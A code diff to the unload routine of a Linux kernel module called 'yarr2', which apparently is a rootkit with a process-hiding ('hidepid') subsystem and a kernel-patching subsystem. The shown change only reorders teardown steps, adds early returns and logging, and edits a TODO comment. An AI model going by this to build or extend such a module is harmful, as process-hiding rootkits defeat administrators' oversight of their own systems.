@@ -42,25 +42,26 @@ static int __init yarr2_init(void) {
 static void __exit yarr2_exit(void) {
     int err;
 
+    // TODO: When stopping a subsystem fails we shouldn't just return there, we
+    // should try to clean the remaining running subsystems.
     yarr_log("Starting unload of yarr2...");
 
     yarr_log("Stopping hidepid subsystem...");
     err = stop_hidepid();
     if (err) {
         yarr_log("Errors!");
+        return;
     }
 
-    // TODO: I don't fully like this approach (coupling between subsystems).
-    // main.c doesn't call patch(), so it shouldn't be calling unpatch_all().
-    // Each subsystem unpatching what they did is the correct way. However
-    // calling a single time unpatch_all() reduces code complexity.
-    yarr_log("Undoing patches...");
-    err = unpatch_all();
+    yarr_log("Stopping patch subsystem...");
+    err = stop_patch();
     if (err) {
         yarr_log("Errors!");
+        return;
     }
 
     yarr_log("Yarr2 unload finished");
+    return;
 }
 
 module_init(yarr2_init);
